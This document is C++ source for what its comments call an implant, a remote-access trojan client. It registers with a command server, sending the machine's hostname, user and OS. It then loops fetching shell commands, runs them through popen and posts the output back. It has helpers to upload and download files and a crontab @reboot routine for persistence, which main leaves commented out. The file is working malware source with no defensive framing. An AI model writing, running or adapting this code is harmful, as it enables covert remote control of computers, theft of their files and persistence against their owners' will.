#include <string>
#include <thread>
#include <chrono>
#include <iostream>
#include <fstream>
#include <csignal>

#include "curl/curl.h"

using namespace std; 

const string HOST_URL = "http://127.0.0.1:3000/";
string ID;

string get_os() {
    #ifdef _WIN32
    return "Windows 32-bit";
    #elif _WIN64
    return "Windows 64-bit";
    #elif __APPLE__
    return "Apple";
    #elif __ANDROID__
    return "Android";
    #elif __linux__
    return "Linux";
    #elif __unix || __unix__
    return "Unix";
    #else
    return "Other";
    #endif
}

size_t write_data(void *contents, size_t size, size_t nmemb, void *userp) {
    ((string*)userp)->append((char*)contents, size * nmemb);
    return size * nmemb;
}

size_t write_data_file(void *ptr, size_t size, size_t nmemb, FILE *stream) {
    size_t written = fwrite(ptr, size, nmemb, stream);
    return written;
}

string exec(string cmd) {
    array<char, 128> buffer;
    string output;
    unique_ptr<FILE, decltype(&pclose)> pipe(popen(cmd.c_str(), "r"), pclose);

    if (!pipe) {
        throw runtime_error("popen() failed!");
    }

    while (fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr) {
        output += buffer.data();
    }

    output.erase(output.length()-1); // remove last newline

    return output;
}

string get(string url) {
    CURL *curl = curl_easy_init();
    CURLcode res;
    string read_buffer;

    if(curl) {
        curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_data);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &read_buffer);

        res = curl_easy_perform(curl);
        curl_easy_cleanup(curl);
    }

    return read_buffer;
}

string post(string url, string data) {
    CURL *curl = curl_easy_init();
    CURLcode res;
    string read_buffer;

    if (curl) {
        curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, data.c_str());
        curl_easy_setopt(curl, CURLOPT_POSTFIELDSIZE, data.length());
        curl_easy_setopt(curl, CURLOPT_POST, 1);
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_data);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &read_buffer);

        res = curl_easy_perform(curl);
        curl_easy_cleanup(curl);
    }
    return read_buffer;
}

void download_file(string url, string location) {
    CURL *curl = curl_easy_init();
    FILE *fp;
    CURLcode res;

    if (curl) {
        fp = fopen(location.c_str(), "wb");
        curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_data_file);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, fp);
        res = curl_easy_perform(curl);
        curl_easy_cleanup(curl);
        fclose(fp);
    }
}

void upload_file(string url, string location, string id) {
    CURL *curl;
    CURLcode res;

    curl_mime *form = NULL;
    curl_mimepart *field = NULL;
    struct curl_slist *headerlist = NULL;
    static const char buf[] = "Expect:";

    curl_global_init(CURL_GLOBAL_ALL);

    curl = curl_easy_init();
    if(curl) {
        /* Create the form */
        form = curl_mime_init(curl);

        /* Fill in the client ID field */
        field = curl_mime_addpart(form);
        curl_mime_name(field, "id");
        curl_mime_data(field, id.c_str(), CURL_ZERO_TERMINATED);

        /* Fill in the file upload field */
        field = curl_mime_addpart(form);
        curl_mime_name(field, "file");
        curl_mime_filedata(field, location.c_str());

        /* Fill in the filename field */
        field = curl_mime_addpart(form);
        curl_mime_name(field, "filename");
        curl_mime_data(field, location.c_str(), CURL_ZERO_TERMINATED);

        /* Fill in the submit field too, even if this is rarely needed */
        field = curl_mime_addpart(form);
        curl_mime_name(field, "submit");
        curl_mime_data(field, "send", CURL_ZERO_TERMINATED);

        /* initialize custom header list (stating that Expect: 100-continue is not
             wanted */
        headerlist = curl_slist_append(headerlist, buf);
        /* what URL that receives this POST */
        curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
        curl_easy_setopt(curl, CURLOPT_MIMEPOST, form);

        /* Perform the request, res will get the return code */
        res = curl_easy_perform(curl);
        /* Check for errors */
        if(res != CURLE_OK)
            fprintf(stderr, "curl_easy_perform() failed: %s\n",
                            curl_easy_strerror(res));

        /* always cleanup */
        curl_easy_cleanup(curl);

        /* then cleanup the form */
        curl_mime_free(form);
        /* free slist */
        curl_slist_free_all(headerlist);
    }
}

void make_shell_persistance() {
    //Create shell script to launch implant
    string file_path = "'" + exec("readlink -f a.out") + "'";
    string shellfile = "#! /bin/sh\n" + file_path;

    //Write script to file
    const char *write_path = "script.sh";
    std::ofstream out(write_path);
    out << shellfile;
    out.close();

    //Get persistance of launch script
    string script_path = exec("readlink -f script.sh");
    cout << script_path << endl;
    string sys_cmd = "(crontab -l; echo '@reboot sh "+ script_path +"' ) | crontab -";

    //Run scrip on Linux
    string os = get_os();
    if(os == "Linux"){
        system(sys_cmd.c_str());
    }
}

void signalHandler(int signum) {
    cout << "Interrupt signal (" << signum << ") received." << endl;
    post(HOST_URL + "disconnect", "id=" + ID);
    exit(signum);
}

int main() {
    string hostname = exec("hostname");
    string user = exec("id -un");
    string os = get_os();

    signal(SIGINT, signalHandler);

    //make_shell_persistance();

    do {
        ID = post(HOST_URL + "connect", "hostname=" + hostname +
                "&user=" + user + "&os=" + os);
        this_thread::sleep_for(chrono::seconds(3));
    } while (ID.empty());

    // Local file test
    //upload_file(HOST_URL + "upload", "/home/brett/0.jpg", ID);

    while (true) {
        string command = post(HOST_URL + "command", "id=" + ID);

        if (!command.empty()) {
            string output = exec(command);
            post(HOST_URL + "output", "id=" + ID + "&output=" + output);
        }

        this_thread::sleep_for(chrono::seconds(3));
    }

    return 0;
}
